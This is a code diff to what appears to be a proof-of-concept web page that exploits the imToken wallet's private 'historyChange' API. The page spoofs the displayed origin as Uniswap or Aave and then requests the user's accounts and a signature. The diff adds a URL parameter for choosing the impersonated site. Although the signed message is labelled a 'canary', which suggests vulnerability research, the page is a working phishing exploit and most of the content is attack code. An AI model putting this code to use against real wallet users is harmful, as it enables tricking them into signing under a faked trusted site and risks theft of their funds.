@@ -13,12 +13,15 @@ pre{white-space:pre-wrap;word-break:break-all;background:#1c2633;padding:12px;bo
 actual.textContent=location.href;
 const sleep=ms=>new Promise(r=>setTimeout(r,ms));
 const hex=s=>'0x'+[...new TextEncoder().encode(s)].map(x=>x.toString(16).padStart(2,'0')).join('');
+const target=new URLSearchParams(location.search).get('target')==='aave'
+  ? {url:'https://app.aave.com/',title:'Aave'}
+  : {url:'https://app.uniswap.org/swap',title:'Uniswap'};
 async function run(){
   while(!window.imToken?.callAPI || !window.ethereum?.request) await sleep(100);
   state.textContent='Calling private.historyChange from '+location.origin;
   imToken.callAPI('private.historyChange',{
-    url:'https://app.uniswap.org/swap',
-    title:'Uniswap',
+    url:target.url,
+    title:target.title,
     loading:false,
     canGoBack:false,
     canGoForward:false
@@ -27,7 +30,7 @@ async function run(){
   try{
     const accounts=await ethereum.request({method:'eth_requestAccounts'});
     state.textContent='Actual document: '+location.href+'\nRequesting a canary signature as '+accounts[0];
-    await ethereum.request({method:'personal_sign',params:[hex('imToken natural historyChange origin spoof canary'),accounts[0]]});
+    await ethereum.request({method:'personal_sign',params:[hex('imToken natural historyChange origin spoof canary for '+target.title),accounts[0]]});
   }catch(e){state.textContent+='\nResult: '+(e?.message||String(e))}
 }
 run();
